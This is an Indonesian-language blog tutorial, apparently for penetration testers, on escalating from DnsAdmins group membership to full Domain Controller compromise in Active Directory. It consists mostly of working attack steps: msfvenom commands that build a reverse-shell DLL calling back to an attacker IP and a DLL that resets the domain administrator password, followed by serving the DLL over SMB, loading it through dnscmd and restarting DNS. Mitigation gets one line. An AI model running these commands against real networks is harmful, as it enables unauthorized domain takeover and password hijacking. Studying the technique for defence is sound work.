---
title: From DnsAdmins to SYSTEM to Domain Compromise
date: 2022-03-30 23:30:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, dnsadmins, privilege escalation]     # TAG names should always be lowercase
author: nairpaa
---

Menjadi member grup **DnsAdmins** memungkinkan kita untuk menggunakan perintah `dnscmd.exe` untuk menentukan plugin DDL yang harus diproses oleh layanan DNS.

Dengan membuat *malicious* DLL, kita sebagai penyerang dapat mengambil alih Domain Controller.

> Penjelasan tentang serangan dapat Anda baca [di sini](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83).
{: .prompt-note }

### Tujuan 

- *Privilege escalation*

### Prasyarat

- User adalah member dari grup DnsAdmins


### Tools

- Msfvenom
- Visual Studio

---

## Tahapan eksploitasi

### Step 1: Cek Keanggotaan Grup

```powershell
PS> whoami /all
```

![whoami /all](/assets/img/posts/dnsadmins-group-abuse/1.png)

### Step 2: Buat Malicious DLL

```bash
# metasploit
➜ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll > privesc.dll

➜ msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > changeadmin.dll
```

> Penggunaan `msfvenom` dapat membuat *environment* menjadi *crash*. Sebagai gantinya kita bisa membuat custom DLL yang lebih aman seperti pada [artikel ini](https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b).
{: .prompt-warning }

### Step 3: Siapkan SMB Server

Tahapan ini dilakukan agar `dnscmd.exe` dapat mengakses DLL yang ada pada SMB server kita.

```bash
# siapkan SMB server (tanpa otentikasi)
➜ lpe smbserver.py share .
```

```powershell
# hubungkan target dengan SMB server kita
PS> net use \\10.10.14.3\share
```

### Step 4: DLL Injection

```powershell
# tambahkan DLL plugin ke DNS server
PS> dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.3\share\privesc.dll

# matikan dan nyalakan DNS agar plugin tereksekusi
PS> sc.exe <FQDN of DC/127.0.0.1> stop dns  
PS> sc.exe <FQDN of DC/127.0.0.1> start dns
```

![DNS DLL Injection](/assets/img/posts/dnsadmins-group-abuse/2.png)

## Mitigasi

Perhatikan kembali penentuan keanggotaan grup **DnsAdmins**.

---

## Referensi

- https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
- https://www.youtube.com/watch?v=8KJebvmd1Fk&t=2740s
- https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
- https://github.com/dim0x69/dns-exe-persistance